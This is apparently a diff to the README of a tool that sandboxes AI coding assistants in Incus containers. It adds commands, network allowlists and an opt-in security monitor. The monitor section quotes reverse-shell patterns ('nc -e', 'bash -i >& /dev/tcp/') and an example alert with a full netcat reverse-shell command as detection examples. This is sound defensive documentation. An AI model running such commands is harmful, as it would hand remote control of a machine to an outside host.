@@ -16,7 +16,7 @@ Run AI coding assistants (Claude Code, opencode, Aider, and more) in isolated, p
 
 **Security First:** Unlike Docker or bare-metal execution, your environment variables, SSH keys, and Git credentials are **never** exposed to AI tools. Containers run in complete isolation with no access to your host credentials unless explicitly mounted.
 
-**Proactive Defense:** COI doesn't just isolate AI tools — it actively watches them. A built-in security monitoring daemon detects reverse shells, credential scanning, and large data reads in real time, automatically pausing or killing the container before damage can occur. No manual intervention needed.
+**Proactive Defense:** COI doesn't just isolate AI tools — it can actively watch them. Enable the built-in security monitoring daemon (`--monitor`) to detect reverse shells, credential scanning, and large data reads in real time, automatically pausing or killing the container before damage can occur. No manual intervention needed.
 
 *Think Docker for AI coding tools, but with system containers that actually work like real machines.*
 
@@ -25,6 +25,7 @@ Run AI coding assistants (Claude Code, opencode, Aider, and more) in isolated, p
 ## Table of Contents
 
 - [Supported AI Coding Tools](#supported-ai-coding-tools)
+- [Supported Tools (detailed)](https://github.com/mensfeld/code-on-incus/wiki/Supported-Tools)
 - [Features](#features)
 - [Quick Start](#quick-start)
 - [Why Incus Instead of Docker or Docker Sandboxes?](#why-incus-instead-of-docker-or-docker-sandboxes)
@@ -53,7 +54,21 @@ Coming soon:
 - Cursor - AI-first code editor
 - And more...
 
-The tool abstraction layer makes it easy to add support for new AI coding assistants.
+**Tool selection:**
+```bash
+coi shell                    # Uses default tool (Claude Code)
+coi shell --tool opencode    # Use opencode instead
+```
+
+**Permission mode** - Control whether AI tools run autonomously or ask before each action:
+```toml
+# ~/.config/coi/config.toml or .coi.toml
+[tool]
+name = "claude"              # Default AI tool
+permission_mode = "bypass"   # "bypass" (default) or "interactive"
+```
+
+See the [Supported Tools wiki page](https://github.com/mensfeld/code-on-incus/wiki/Supported-Tools) for detailed configuration, API key setup, and adding new tools.
 
 ## Features
 
@@ -63,7 +78,7 @@ The tool abstraction layer makes it easy to add support for new AI coding assist
 - Persistent containers - Keep containers alive between sessions (installed tools preserved)
 - Workspace isolation - Each session mounts your project directory
 - Slot isolation - Each parallel slot has its own home directory (files don't leak between slots)
-- Workspace files persist even in ephemeral mode** - Only the container is deleted, your work is always saved
+- **Workspace files persist even in ephemeral mode** - Only the container is deleted, your work is always saved
 - Container snapshots - Create checkpoints, rollback changes, and branch experiments with full state preservation
 
 **Security & Isolation**
@@ -355,11 +370,17 @@ colima ssh
 # Interactive session (defaults to Claude Code)
 coi shell
 
+# Use a different AI tool
+coi shell --tool opencode
+
 # Persistent mode - keep container between sessions
 coi shell --persistent
 
 # Use specific slot for parallel sessions
 coi shell --slot 2
+
+# Enable security monitoring
+coi shell --monitor
 
 # Resume previous session (auto-detects latest for this workspace)
 coi shell --resume
@@ -367,11 +388,25 @@ coi shell --resume
 # Resume specific session by ID
 coi shell --resume=<session-id>
 
+# Run a command in an ephemeral container
+coi run "npm test"
+coi run "pytest" --capture --format json
+
 # Attach to existing session
 coi attach
 
 # List active containers and saved sessions
 coi list --all
+
+# Show detailed session information
+coi info
+coi info <session-id>
+
+# Resume a paused/frozen container (e.g., after security monitor auto-pause)
+coi resume <container-name>
+
+# Convert a running ephemeral session to persistent
+coi persist
 
 # Gracefully shutdown specific container (60s timeout)
 coi shutdown coi-abc12345-1
@@ -418,15 +453,18 @@ coi image cleanup myproject- --keep 3            # Keep only 3 most recent versi
 ### Global Flags
 
 ```bash
---workspace PATH       # Workspace directory to mount (default: current directory)
---slot NUMBER          # Slot number for parallel sessions (0 = auto-allocate)
---persistent           # Keep container between sessions
---resume [SESSION_ID]  # Resume from session (omit ID to auto-detect latest for workspace)
+--workspace PATH        # Workspace directory to mount (default: current directory)
+--slot NUMBER           # Slot number for parallel sessions (0 = auto-allocate)
+--persistent            # Keep container between sessions
+--resume [SESSION_ID]   # Resume from session (omit ID to auto-detect latest for workspace)
 --continue [SESSION_ID] # Alias for --resume
---profile NAME         # Use named profile
---image NAME           # Use custom image (default: coi)
---env KEY=VALUE        # Set environment variables
---storage PATH         # Mount persistent storage
+--profile NAME          # Use named profile
+--image NAME            # Use custom image (default: coi)
+--env KEY=VALUE         # Set environment variables (repeatable)
+--mount HOST:CONTAINER  # Mount directory into container (repeatable)
+--network MODE          # Network mode: restricted (default), allowlist, open
+--monitor               # Enable security monitoring with automatic threat response
+--writable-git-hooks    # Allow container to write to .git/hooks (disables protection)
 ```
 
 ### Advanced Usage
@@ -532,6 +570,7 @@ mount_claude_config = true
 
 [tool]
 name = "claude"  # AI coding tool to use: "claude" (default) or "opencode"
+permission_mode = "bypass"  # "bypass" (default) or "interactive"
 # binary = "claude"  # Optional: override binary name
 
 [paths]
@@ -593,6 +632,8 @@ See the [Container Lifecycle and Sessions guide](https://github.com/mensfeld/cod
 coi shell --persistent        # Keep container between sessions
 coi shell --resume            # Resume previous conversation
 coi attach                    # Reconnect to running container
+coi persist                   # Convert ephemeral session to persistent
+coi resume <name>             # Resume paused/frozen container
 sudo poweroff                 # Properly stop container (inside)
 coi shutdown <name>           # Graceful stop (outside)
 ```
@@ -615,12 +656,20 @@ coi shell --network=open       # Open mode
 
 **Docker Registry Access:**
 
-Docker registries (docker.io, ghcr.io, etc.) are accessible in **restricted mode** by default. In **allowlist mode**, you'll need to add registry domains to your allowlist:
+Docker registries (docker.io, ghcr.io, etc.) are accessible in **restricted mode** by default. In **allowlist mode**, you'll need to add registry domains to your allowlist config:
+
+```toml
+# ~/.config/coi/config.toml
+[network]
+mode = "allowlist"
+allowed_domains = [
+  "registry-1.docker.io",
+  "auth.docker.io",
+  "production.cloudflare.docker.com"
+]
+```
 
 ```bash
-# For Docker Hub
-coi config set network.allowlist "registry-1.docker.io,auth.docker.io,production.cloudflare.docker.com"
-
 # Or use open mode for the session
 coi shell --network=open
 ```
@@ -641,11 +690,23 @@ curl http://<container-ip>:3000
 
 ## Security Monitoring
 
-`coi` includes **always-on security monitoring** to detect and respond to malicious behavior in real-time. The monitoring daemon runs automatically during sessions and protects against:
+`coi` includes **built-in security monitoring** to detect and respond to malicious behavior in real-time. Enable it with the `--monitor` flag or via config to activate threat detection and automated response:
+
+```bash
+# Enable via CLI flag
+coi shell --monitor
+
+# Or enable permanently in config
+# ~/.config/coi/config.toml
+# [monitoring]
+# enabled = true
+```
+
+**Protects against:**
 
 **Threat Detection:**
 - **Reverse shells** - Detects `nc -e`, `bash -i >& /dev/tcp/`, Python/Perl/Ruby reverse shell patterns
-- **Data exfiltration** - Monitors large workspace reads that may indicate code theft attempts
+- **Data exfiltration** - Monitors large workspace reads and writes that may indicate code theft or data packaging attempts
 - **Environment scanning** - Flags processes searching for API keys, secrets, and credentials
 - **Network threats (NFT)** - Real-time kernel-level detection of:
   - Connections to private networks (RFC1918)
@@ -675,14 +736,12 @@ coi monitor coi-abc-1 --json
 
 **Review Audit Log:**
 ```bash
-# View all security events
-coi monitor audit coi-abc-1
+# Audit logs are stored in JSONL format
+cat ~/.coi/audit/<container-name>.jsonl
 
 # Filter by severity
-coi monitor audit coi-abc-1 --level=critical,high
-
-# Export for analysis
-coi monitor audit coi-abc-1 --export=report.json
+cat ~/.coi/audit/<container-name>.jsonl | grep '"level":"critical"'
+cat ~/.coi/audit/<container-name>.jsonl | grep '"level":"high"'
 ```
 
 **Example Alert:**
@@ -700,12 +759,14 @@ Process 'nc -e /bin/bash 192.168.1.100 4444' (PID 1235) matches reverse shell pa
 ```toml
 # ~/.config/coi/config.toml
 [monitoring]
-enabled = true                    # Enable/disable monitoring
+enabled = true                    # Enable monitoring (or use --monitor flag per-session)
 auto_pause_on_high = true        # Pause on high-severity threats
 auto_kill_on_critical = true     # Kill on critical threats
 poll_interval_sec = 2            # Monitoring frequency
 file_read_threshold_mb = 50.0    # MB read before alerting
 file_read_rate_mb_per_sec = 10.0 # Sustained read rate threshold
+file_write_threshold_mb = 50.0   # MB written before alerting
+file_write_rate_mb_per_sec = 10.0 # Sustained write rate threshold
 audit_log_retention_days = 30    # Audit log retention
 
 [monitoring.nft]
